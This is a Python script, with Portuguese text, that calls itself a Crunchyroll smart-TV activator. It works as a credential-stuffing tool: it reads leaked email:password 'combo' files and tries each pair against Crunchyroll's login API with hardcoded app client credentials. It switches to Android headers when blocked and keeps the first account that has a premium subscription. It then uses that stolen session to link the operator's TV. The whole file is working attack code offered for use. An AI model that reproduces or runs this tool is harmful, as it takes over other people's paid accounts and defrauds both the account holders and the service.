import os
import re
import sys
import json
import uuid
import time
import base64
import threading
import random
from typing import Dict, Optional, Tuple, List, Set

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Ativa cores no CMD do Windows
if os.name == 'nt':
    os.system("")

# ============================================
#  CORES ANSI (Para modo CLI)
# ============================================
C_RESET   = "\033[0m"
C_BOLD    = "\033[1m"
C_GREEN   = "\033[92m"
C_LGREEN  = "\033[38;5;82m"
C_RED     = "\033[91m"
C_LRED    = "\033[38;5;196m"
C_YELLOW  = "\033[93m"
C_GOLD    = "\033[38;5;220m"
C_CYAN    = "\033[96m"
C_LCYAN   = "\033[38;5;51m"
C_GRAY    = "\033[90m"
C_ORANGE  = "\033[38;5;208m"
C_DIM     = "\033[2m"

# ============================================
#  CONFIGURAÇÕES & ENDPOINTS OFICIAIS
# ============================================
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
COMBO_DIR  = os.path.join(BASE_DIR, "combo")
TIMEOUT    = (8, 15)
MAX_RETRY  = 3

AUTH_URL     = "https://www.crunchyroll.com/auth/v1/token"
DEVICE_URL   = "https://www.crunchyroll.com/auth/v1/device"
BENEFITS_URL = "https://www.crunchyroll.com/subs/v1/subscriptions/{ext_id}/benefits"

LOGIN_HEADERS = {
    "Host": "www.crunchyroll.com",
    "User-Agent": "UnityPlayer/2022.3.52f1 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "Accept": "*/*",
    "Accept-Encoding": "deflate, gzip",
    "Authorization": "Basic eW9jbnNicmt2cGFtcHl1eHF4a3E6b3FqOWxhdGJwV21PRUU4SUZEbV96eGkwTXJIY2R3UzE=",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Unity-Version": "2022.3.52f1",
    "Connection": "keep-alive",
}

ANDROID_LOGIN_HEADERS = {
    "Host": "www.crunchyroll.com",
    "User-Agent": "Crunchyroll/3.67.0 Android/14",
    "Accept": "*/*",
    "Accept-Encoding": "deflate, gzip",
    "Authorization": "Basic bm9haWhkZXZtZ2puMmpleFg3ZGlfZTpsTjFRQXp4WV9kZzVPelZ5U3ZzYkJlUjhkX2t3cFljbg==",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
}

# ============================================
#  MAPEAMENTO DE PLANOS
# ============================================
PLAN_MAP = {
    "cr_premium": "FAN",
    "cr_fan_pack": "MEGA FAN",
    "cr_superfan_pack": "ULTIMATE FAN",
    "cr_ultimate_fan_pack": "ULTIMATE FAN",
    "cr_mega_fan_pack": "MEGA FAN",
    "no_ads": "FAN",
    "premium": "FAN",
    "fanpack": "MEGA FAN",
    "superfan": "ULTIMATE FAN",
    "ultimate_fan": "ULTIMATE FAN",
    "mega_fan": "MEGA FAN",
}

PLAN_KEYWORDS = [
    ("ultimate_fan", "ULTIMATE FAN"),
    ("superfan",     "ULTIMATE FAN"),
    ("mega_fan",     "MEGA FAN"),
    ("fan_pack",     "MEGA FAN"),
    ("cr_premium",   "FAN"),
    ("premium",      "FAN"),
    ("no_ads",       "FAN"),
]

PREMIUM_KW = [
    "premium", "fan_pack", "superfan", "mega_fan", "ultimate_fan", "no_ads",
    "fan", "mega", "ultimate", "subscription", "subscribed", "paid", "membership",
    "cr_premium", "cr_fan", "cr_mega", "cr_superfan", "cr_ultimate"
]

# Cache compartilhado
USED_COMBOS: Set[str] = set()

# ============================================
#  UTILS
# ============================================
def decode_jwt(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        payload += "=" * (4 - len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}

def normalize_benefits(raw) -> List[str]:
    if not raw:
        return []
    if isinstance(raw, list):
        result = []
        for b in raw:
            if isinstance(b, str) and b.strip():
                result.append(b.strip())
            elif isinstance(b, dict):
                for k in ["benefit", "name", "id", "slug", "type"]:
                    if k in b:
                        val = str(b[k]).strip()
                        if val:
                            result.append(val)
                            break
        return result
    if isinstance(raw, str) and raw.strip():
        return [raw.strip()]
    return []

def get_plan_name(benefits: List[str]) -> str:
    if not benefits:
        return "FREE"
    bl = [str(b).lower().strip() for b in benefits]
    for b in bl:
        for k, v in PLAN_MAP.items():
            if k.lower() == b:
                return v
    for b in bl:
        for k, v in PLAN_MAP.items():
            if k.lower() in b and len(k) >= 4:
                return v
    for b in bl:
        for kw, plan in PLAN_KEYWORDS:
            if kw in b:
                return plan
    return "FREE"

def is_premium(benefits: List[str]) -> bool:
    for b in benefits:
        b_s = str(b).lower().strip()
        for kw in PREMIUM_KW:
            if kw in b_s:
                return True
    return False

def extract_ext_id(payload: dict) -> str:
    for key in ["ext_id", "external_id", "account_id", "id"]:
        val = payload.get(key)
        if val:
            return str(val)
    scopes = payload.get("scopes", {})
    if isinstance(scopes, dict):
        cr = scopes.get("cr", {})
        if isinstance(cr, dict):
            for key in ["ext_id", "external_id", "account_id", "id"]:
                val = cr.get(key)
                if val:
                    return str(val)
    return ""

def country_flag(code: str) -> str:
    if not code or len(code) != 2:
        return "🌐"
    try:
        return chr(0x1F1E6 + ord(code[0].upper()) - ord("A")) + chr(0x1F1E6 + ord(code[1].upper()) - ord("A"))
    except Exception:
        return "🌐"

# ============================================
#  SESSÃO HTTP
# ============================================
def make_session() -> requests.Session:
    s = requests.Session()
    a = HTTPAdapter(pool_connections=10, pool_maxsize=10,
                    max_retries=Retry(total=0, connect=0, read=0))
    s.mount("http://", a)
    s.mount("https://", a)
    return s

# ============================================
#  LOAD COMBOS
# ============================================
def load_combos(target_dir: str = COMBO_DIR) -> List[Tuple[str, str, str]]:
    """
    Carrega todos os combos dos arquivos .txt da pasta.
    Retorna lista de tuplas: (email, senha, nome_do_arquivo)
    """
    combos = []
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)
        return combos

    for filename in sorted(os.listdir(target_dir)):
        if not filename.endswith(".txt"):
            continue
        filepath = os.path.join(target_dir, filename)
        try:
            with open(filepath, "r", encoding="utf-8-sig", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    line = line.split("#")[0].strip()
                    sep = ":" if ":" in line else "|" if "|" in line else None
                    if not sep:
                        continue
                    parts = line.split(sep, 1)
                    if len(parts) == 2:
                        email = re.sub(r"\s+", "", parts[0].strip())
                        pwd   = parts[1].strip()
                        if email and pwd and "@" in email:
                            combos.append((email, pwd, filename))
        except Exception:
            continue
    return combos

# ============================================
#  LOGIN + CHECAR ASSINATURA
# ============================================
def check_account(session: requests.Session, email: str, password: str) -> dict:
    """
    Tenta login e verifica assinatura.
    Retorna dict com: status ('premium' | 'free' | 'bad' | 'error'), access_token, country, plan, benefits, token_exp
    """
    data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access account content mp:limited pins reviews talkbox teen-profile",
    }

    for attempt in range(MAX_RETRY):
        try:
            resp = session.post(AUTH_URL, headers=LOGIN_HEADERS, data=data, timeout=TIMEOUT)
        except Exception:
            if attempt < MAX_RETRY - 1:
                time.sleep(1.5)
                continue
            return {"status": "error", "reason": "CONN_FAIL"}

        if resp.status_code == 200:
            try:
                jd = resp.json()
            except Exception:
                return {"status": "error", "reason": "PARSE_ERR"}

            access_token = jd.get("access_token", "")
            if not access_token:
                return {"status": "bad", "reason": "NO_TOKEN"}

            payload = decode_jwt(access_token)
            country = payload.get("country", "BR") or "BR"
            token_exp = payload.get("exp", int(time.time() + 3600))

            # Benefits do JWT
            jwt_bens = normalize_benefits(payload.get("benefits"))
            benefits = list(jwt_bens)

            # Tenta buscar da API de subscriptions para máxima fidelidade
            ext_id = extract_ext_id(payload)
            if ext_id:
                try:
                    url = BENEFITS_URL.format(ext_id=ext_id)
                    headers_ben = {
                        "Host": "www.crunchyroll.com",
                        "User-Agent": "UnityPlayer/2022.3.52f1 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
                        "Accept": "*/*",
                        "Accept-Encoding": "deflate, gzip",
                        "Authorization": f"Bearer {access_token}",
                        "X-Unity-Version": "2022.3.52f1",
                        "Connection": "keep-alive",
                    }
                    r2 = session.get(url, headers=headers_ben, timeout=(4, 8))
                    if r2.status_code == 200:
                        api_bens = normalize_benefits(r2.json().get("benefits"))
                        if api_bens:
                            benefits = api_bens
                except Exception:
                    pass

            plan = get_plan_name(benefits)
            has_premium = is_premium(benefits) or (plan not in ["FREE", ""])

            return {
                "status": "premium" if has_premium else "free",
                "access_token": access_token,
                "country": country.upper(),
                "plan": f"Crunchyroll {plan}" if not plan.startswith("Crunchyroll") else plan,
                "benefits": benefits,
                "exp": token_exp
            }

        elif resp.status_code == 429:
            wait = 4 * (attempt + 1)
            time.sleep(wait)
            continue

        elif resp.status_code == 403:
            # Tenta fallback imediato com headers do cliente Android
            try:
                resp_android = session.post(AUTH_URL, headers=ANDROID_LOGIN_HEADERS, data=data, timeout=TIMEOUT)
                if resp_android.status_code == 200:
                    try:
                        jd = resp_android.json()
                        access_token = jd.get("access_token", "")
                        if access_token:
                            payload = decode_jwt(access_token)
                            country = payload.get("country", "BR") or "BR"
                            token_exp = payload.get("exp", int(time.time() + 3600))
                            jwt_bens = normalize_benefits(payload.get("benefits"))
                            plan = get_plan_name(jwt_bens)
                            has_premium = is_premium(jwt_bens) or (plan not in ["FREE", ""])
                            return {
                                "status": "premium" if has_premium else "free",
                                "access_token": access_token,
                                "country": country.upper(),
                                "plan": f"Crunchyroll {plan}" if not plan.startswith("Crunchyroll") else plan,
                                "benefits": jwt_bens,
                                "exp": token_exp
                            }
                    except Exception:
                        pass
                elif resp_android.status_code == 401:
                    return {"status": "bad", "reason": "WRONG_CREDS"}
            except Exception:
                pass
            return {"status": "error", "reason": "HTTP_403"}

        elif resp.status_code == 401:
            return {"status": "bad", "reason": "WRONG_CREDS"}

        else:
            try:
                err = resp.json().get("error", f"HTTP_{resp.status_code}")
            except Exception:
                err = f"HTTP_{resp.status_code}"
            return {"status": "error", "reason": err}

    return {"status": "error", "reason": "MAX_RETRY"}

# ============================================
#  ATIVAR TV
# ============================================
def ativar_tv(access_token: str, user_code: str) -> Tuple[bool, str, dict]:
    """
    Envia o payload de ativação para a Crunchyroll.
    Retorna (sucesso: bool, mensagem: str, dados_adicionais: dict)
    """
    clean_code = re.sub(r'[^A-Za-z0-9]', '', user_code).upper()
    if not clean_code:
        return False, "Código de ativação da TV inválido ou vazio.", {}

    anon_id = str(uuid.uuid4())
    headers = {
        "Host": "www.crunchyroll.com",
        "etp-anonymous-id": anon_id,
        "sec-ch-ua-platform": '"Windows"',
        "Authorization": f"Bearer {access_token}",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Microsoft Edge";v="150"',
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.crunchyroll.com/pt-br/activate",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    }
    payload = {"user_code": clean_code}

    try:
        resp = requests.post(DEVICE_URL, headers=headers, json=payload, timeout=20)
    except Exception as e:
        return False, f"Falha de conexão com os servidores da Crunchyroll: {e}", {}

    try:
        resp_json = resp.json()
    except Exception:
        resp_json = {}

    # Se retornou 403, tenta fallback com cabeçalho alternativo
    if resp.status_code == 403:
        alt_headers = dict(headers)
        alt_headers["Referer"] = "https://www.crunchyroll.com/activate"
        alt_headers["Accept-Encoding"] = "gzip, deflate, br"
        try:
            alt_resp = requests.post(DEVICE_URL, headers=alt_headers, json=payload, timeout=15)
            if alt_resp.status_code in (200, 201, 204):
                try:
                    alt_json = alt_resp.json()
                except Exception:
                    alt_json = {}
                return True, "TV pareada e ativada com sucesso na Crunchyroll!", alt_json
            elif alt_resp.status_code != 403:
                resp = alt_resp
                try:
                    resp_json = resp.json()
                except Exception:
                    resp_json = {}
        except Exception:
            pass

    if resp.status_code in (200, 201, 204):
        return True, "TV pareada e ativada com sucesso na Crunchyroll!", resp_json

    elif resp.status_code == 400:
        error = resp_json.get("error", "")
        desc = resp_json.get("message") or resp_json.get("error_description", "")
        msg = f"Código '{clean_code}' inválido ou expirado na TV."
        if desc:
            msg += f" ({desc})"
        return False, msg, resp_json

    elif resp.status_code == 401:
        return False, "Sessão de token expirada na Crunchyroll. Nova tentativa em andamento...", resp_json

    elif resp.status_code == 403:
        desc = resp_json.get("message") or resp_json.get("error_description") or resp_json.get("error") or ""
        if desc:
            if any(w in desc.lower() for w in ["code", "expired", "invalid", "código", "expirou"]):
                msg = f"Código '{clean_code}' inválido ou expirado na TV ({desc}). Gere um novo na TV."
            elif any(w in desc.lower() for w in ["token", "auth", "session", "grant"]):
                msg = f"Sessão de token recusada pela Crunchyroll ({desc})."
            else:
                msg = f"Crunchyroll recusou a ativação: {desc} (HTTP 403)"
        else:
            msg = f"Código '{clean_code}' expirou ou foi recusado pela Crunchyroll (HTTP 403). Gere um novo código de 6 dígitos na TV."
        return False, msg, resp_json

    elif resp.status_code == 404:
        return False, f"Código '{clean_code}' não encontrado na Crunchyroll. Gere um novo na TV.", resp_json

    elif resp.status_code == 429:
        return False, "Muitas tentativas simultâneas. Aguarde 1 minuto e tente novamente.", resp_json

    else:
        desc = resp_json.get("message") or resp_json.get("error_description") or resp_json.get("error") or ""
        msg = f"Erro na Crunchyroll: HTTP {resp.status_code}"
        if desc:
            msg += f" ({desc})"
        return False, msg, resp_json


# ============================================
#  MODO CLI (Para execução direta via terminal)
# ============================================
def main():
    print(C_ORANGE + "╔" + "═" * 55 + "╗" + C_RESET)
    print(C_ORANGE + "║" + C_RESET + C_BOLD + C_GOLD + "    📺  CRUNCHYROLL — ATIVADOR DE SMART TV  📺    ".center(55) + C_RESET + C_ORANGE + "║" + C_RESET)
    print(C_ORANGE + "║" + C_RESET + C_DIM +   "  Busca conta premium nos combos e ativa TV  ".center(55) + C_RESET + C_ORANGE + "║" + C_RESET)
    print(C_ORANGE + "╚" + "═" * 55 + "╝" + C_RESET)
    print()

    combos = load_combos()
    if not combos:
        print(C_RED + f"[!] Nenhum combo encontrado na pasta '{COMBO_DIR}'." + C_RESET)
        sys.exit(1)

    print(C_LGREEN + f"    {len(combos)} combo(s) carregado(s)." + C_RESET)
    user_code = input(C_BOLD + "  📺 Digite o código da TV: " + C_RESET).strip().upper()
    if not user_code:
        print(C_RED + "Código não pode ser vazio." + C_RESET)
        sys.exit(1)

    session = make_session()
    found = None
    for email, pwd, fname in combos:
        res = check_account(session, email, pwd)
        if res.get("status") == "premium":
            found = res
            found["email"] = email
            break

    if not found:
        print(C_RED + "Nenhuma conta premium válida nos combos." + C_RESET)
        sys.exit(1)

    ok, msg, _ = ativar_tv(found["access_token"], user_code)
    if ok:
        print(C_LGREEN + f"\n  ✅ TV ativada com sucesso com a conta {found['email']} ({found['plan']})!" + C_RESET)
    else:
        print(C_RED + f"\n  ❌ {msg}" + C_RESET)

if __name__ == "__main__":
    main()
